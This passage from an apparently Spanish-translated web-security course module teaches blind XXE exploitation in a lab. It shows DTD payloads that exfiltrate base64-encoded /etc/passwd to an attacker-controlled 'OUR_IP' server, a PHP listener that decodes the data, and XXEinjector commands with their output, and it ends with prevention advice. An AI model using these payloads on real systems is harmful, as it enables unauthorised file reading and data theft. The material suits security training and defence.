Una vez que alojamos nuestro script DTD como lo hicimos anteriormente y enviamos la carga útil anterior como nuestros datos XML (no es necesario incluir ningún otro dato XML), obtendremos el contenido del `/etc/hosts` archivo de la siguiente manera: ![Solicitud HTTP POST a /error/submitDetails.php con XML DOCTYPE para ataque XXE, causando error URI no válido en la respuesta PHP.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)

Este método también se puede utilizar para leer el código fuente de los archivos. Todo lo que tenemos que hacer es cambiar el nombre del archivo en nuestro script DTD para apuntar al archivo que queremos leer (por ejemplo. `"file:///var/www/html/submitDetails.php"`). Sin embargo, `this method is not as reliable as the previous method for reading source files`, ya que puede tener limitaciones de longitud, y ciertos caracteres especiales aún pueden romperlo.


# Exfiltración de Datos Ciegos

---

En la sección anterior, vimos un ejemplo de una vulnerabilidad XXE ciega, donde no recibimos ninguna salida que contenga ninguna de nuestras entidades de entrada XML. A medida que el servidor web mostraba errores de tiempo de ejecución de PHP, podíamos usar este defecto para leer el contenido de los archivos de los errores mostrados. En esta sección, veremos cómo podemos obtener el contenido de los archivos en una situación completamente ciega, donde no obtenemos la salida de ninguna de las entidades XML ni obtenemos ningún error de PHP que se muestre.

---

## Exfiltración de Datos Fuera de Banda

Si intentamos repetir alguno de los métodos con el ejercicio que encontramos en `/blind`, notaremos rápidamente que ninguno de ellos parece funcionar, ya que no tenemos forma de tener nada impreso en la respuesta de la aplicación web. Para tales casos, podemos utilizar un método conocido como `Out-of-band (OOB) Data Exfiltration`, que a menudo se usa en casos ciegos similares con muchos ataques web, como inyecciones SQL ciegas, inyecciones de comandos ciegas, XSS ciego y, por supuesto, XXE ciego. Ambos el [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss) y el [Whitebox Pentesting 101: Inyecciones de Comando](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) los módulos discutieron ataques similares, y aquí utilizaremos un ataque similar, con ligeras modificaciones para adaptarse a nuestra vulnerabilidad XXE.

En nuestros ataques anteriores, utilizamos un `out-of-band` ataque ya que alojamos el archivo DTD en nuestra máquina e hicimos que la aplicación web se conectara a nosotros (de ahí fuera de banda). Entonces, nuestro ataque esta vez será bastante similar, con una diferencia significativa. En lugar de tener la aplicación web de salida de nuestro `file` entidad a una entidad XML específica, haremos que la aplicación web envíe una solicitud web a nuestro servidor web con el contenido del archivo que estamos leyendo.

Para hacerlo, primero podemos usar una entidad de parámetros para el contenido del archivo que estamos leyendo mientras utilizamos el filtro PHP para codificarlo base64. Luego, crearemos otra entidad de parámetros externos y la haremos referencia a nuestra IP, y colocaremos el `file` valor del parámetro como parte de la URL que se solicita a través de HTTP, de la siguiente manera:

Código: xml

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Si, por ejemplo, el archivo que queremos leer tuviera el contenido de `XXE_SAMPLE_DATA`, entonces el `file` el parámetro mantendría sus datos codificados base64 (`WFhFX1NBTVBMRV9EQVRB`). Cuando el XML intenta hacer referencia al externo `oob` parámetro de nuestra máquina, solicitará `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finalmente, podemos decodificar el `WFhFX1NBTVBMRV9EQVRB` cadena para obtener el contenido del archivo. Incluso podemos escribir un script PHP simple que detecte automáticamente el contenido del archivo codificado, lo decodifique y lo envíe al terminal:

Código: php

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Entonces, primero escribiremos el código PHP anterior para `index.php`, y luego iniciar un servidor PHP en el puerto `8000`, como sigue:

  Exfiltración de Datos Ciegos

```shell-session
vcrdcr@htb[/htb]$ vi index.php # here we write the above PHP code
vcrdcr@htb[/htb]$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

Ahora, para iniciar nuestro ataque, podemos usar una carga útil similar a la que usamos en el ataque basado en errores, y simplemente agregar `<root>&content;</root>`, que es necesario para hacer referencia a nuestra entidad y hacer que envíe la solicitud a nuestra máquina con el contenido del archivo:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Luego, podemos enviar nuestra solicitud a la aplicación web: ![Solicitud HTTP POST a /blind/submitDetails.php con XML DOCTYPE para ataque XXE, lo que resulta en una respuesta de 200 OK que instruye para verificar el correo electrónico.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)

Finalmente, podemos volver a nuestro terminal, y veremos que efectivamente obtuvimos la solicitud y su contenido decodificado:

  Exfiltración de Datos Ciegos

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

**Consejo:** Además de almacenar nuestros datos codificados base64 como parámetro de nuestra URL, podemos utilizar `DNS OOB Exfiltration` al colocar los datos codificados como un subdominio para nuestra URL (por ejemplo. `ENCODEDTEXT.our.website.com`), y luego usar una herramienta como `tcpdump` para capturar cualquier tráfico entrante y decodificar la cadena de subdominio para obtener los datos. De acuerdo, este método es más avanzado y requiere más esfuerzo para filtrar datos a través de.

---

## Exfiltración OOB Automatizada

Aunque en algunos casos puede que tengamos que utilizar el método manual que aprendimos anteriormente, en muchos otros casos, podemos automatizar el proceso de exfiltración ciega de datos XXE con herramientas. Una de esas herramientas es [XXEinyector](https://github.com/enjoiz/XXEinjector). Esta herramienta admite la mayoría de los trucos que aprendimos en este módulo, incluidos XXE básico, exfiltración de fuente CDATA, XXE basado en errores y OOB XXE ciego.

Para utilizar esta herramienta para la exfiltración OOB automatizada, primero podemos clonar la herramienta a nuestra máquina, de la siguiente manera:

  Exfiltración de Datos Ciegos

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

Cloning into 'XXEinjector'...
...SNIP...
```

Una vez que tengamos la herramienta, podemos copiar la solicitud HTTP de Burp y escribirla en un archivo para que la herramienta la use. No debemos incluir los datos XML completos, solo la primera línea, y escribir `XXEINJECT` después de esto como un localizador de posición para la herramienta:

Código: http

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Ahora, podemos ejecutar la herramienta con el `--host`/`--httpport` las banderas son nuestra IP y puerto, el `--file` la bandera es el archivo que escribimos anteriormente, y el `--path` la bandera es el archivo que queremos leer. También seleccionaremos el `--oob=http` y `--phpfilter` banderas para repetir el ataque OOB que hicimos arriba, de la siguiente manera:

  Exfiltración de Datos Ciegos

```shell-session
vcrdcr@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

Vemos que la herramienta no imprimió directamente los datos. Esto se debe a que somos base64 codificando los datos, por lo que no se imprime. En cualquier caso, todos los archivos exfiltrados se almacenan en el `Logs` carpeta debajo de la herramienta, y podemos encontrar nuestro archivo allí:

  Exfiltración de Datos Ciegos

```shell-session
vcrdcr@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```

Intente utilizar la herramienta para repetir otros métodos XXE que aprendimos.


# XXE Prevención

---

Hemos visto que las vulnerabilidades XXE ocurren principalmente cuando una entrada XML insegura hace referencia a una entidad externa, que finalmente se explota para leer archivos confidenciales y realizar otras acciones. La prevención de vulnerabilidades XXE es relativamente más fácil que la prevención de otras vulnerabilidades web, ya que son causadas principalmente por bibliotecas XML obsoletas.

---

## Evitar Componentes Desactuados

Mientras que otras vulnerabilidades web de validación de entrada generalmente se evitan a través de prácticas de codificación seguras (por ejemplo, XSS, IDOR, SQLi, OS Injection), esto no es del todo necesario para evitar vulnerabilidades XXE. Esto se debe a que la entrada XML generalmente no es manejada manualmente por los desarrolladores web, sino por las bibliotecas XML integradas. Por lo tanto, si una aplicación web es vulnerable a XXE, esto es muy probable debido a una biblioteca XML obsoleta que analiza los datos XML.

Por ejemplo, PHP's [libxml_disable_entity_loader](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) la función está en desuso, ya que permite a un desarrollador habilitar entidades externas de manera insegura, lo que conduce a vulnerabilidades XXE. Si visitamos la documentación de PHP para esta función, vemos la siguiente advertencia:

**Advertencia**

Esta función ha sido _DEPRECADO_ a partir de PHP 8.0.0. Confiar en esta función es muy desalentador.

Además, incluso los editores de código comunes (por ejemplo, VSCode) resaltarán que esta función específica está en desuso y nos advertirán contra su uso: ![código PHP que muestra libxml_disable_entity_loader(false), marcado como obsoleto, deshabilitando la carga de entidad externa.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_deprecated_warning.jpg)

**Nota:** Puede encontrar un informe detallado de todas las bibliotecas XML vulnerables, con recomendaciones sobre cómo actualizarlas y usar funciones seguras, en [Hoja de trucos de prevención XXE de OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php).

Además de actualizar las bibliotecas XML, también deberíamos actualizar cualquier componente que analice la entrada XML, como las bibliotecas API como SOAP. Además, cualquier procesador de documentos o archivos que pueda realizar análisis XML, como procesadores de imágenes SVG o procesadores de documentos PDF, también puede ser vulnerable a vulnerabilidades XXE, y también debemos actualizarlas.

Estos problemas no son exclusivos solo de las bibliotecas XML, ya que lo mismo se aplica a todos los demás componentes web (por ejemplo, obsoletos `Node Modules`). Además de los gestores de paquetes comunes (p. ej. `npm`), los editores de código comunes notificarán a los desarrolladores web sobre el uso de componentes obsoletos y sugerirán otras alternativas. Al final, `using the latest XML libraries and web development components can greatly help reduce various web vulnerabilities`, incluyendo XXE.

---

## Usando Configuraciones XML Seguras

Además de utilizar las bibliotecas XML más recientes, ciertas configuraciones XML para aplicaciones web pueden ayudar a reducir la posibilidad de explotación de XXE. Estos incluyen:

- Deshabilitar la referencia personalizada `Document Type Definitions (DTDs)`
- Deshabilitar la referencia `External XML Entities`
- Desactivar `Parameter Entity` procesamiento
- Desactivar el soporte para `XInclude`
- Prevenir `Entity Reference Loops`

Otra cosa que vimos fue la explotación XXE basada en errores. Por lo tanto, siempre debemos tener un manejo de excepciones adecuado en nuestras aplicaciones web y `should always disable displaying runtime errors in web servers`.

Dichas configuraciones deberían ser otra capa de protección si no actualizamos algunas bibliotecas XML y también deberíamos evitar la explotación de XXE. Sin embargo, todavía podemos estar utilizando bibliotecas vulnerables en tales casos y solo aplicando soluciones alternativas contra la explotación, lo cual no es ideal.

Con los diversos problemas y vulnerabilidades introducidos por los datos XML, muchos también recomiendan `using other formats, such as JSON or YAML`. Esto también incluye evitar los estándares de API que se basan en XML (por ejemplo, SOAP) y usar API basadas en JSON (por ejemplo, REST).

Finalmente, el uso de Firewalls de Aplicaciones Web (WAF) es otra capa de protección contra la explotación de XXE. Sin embargo, nunca debemos confiar por completo en los WAF y dejar el back-end vulnerable, ya que los WAF siempre se pueden pasar por alto.


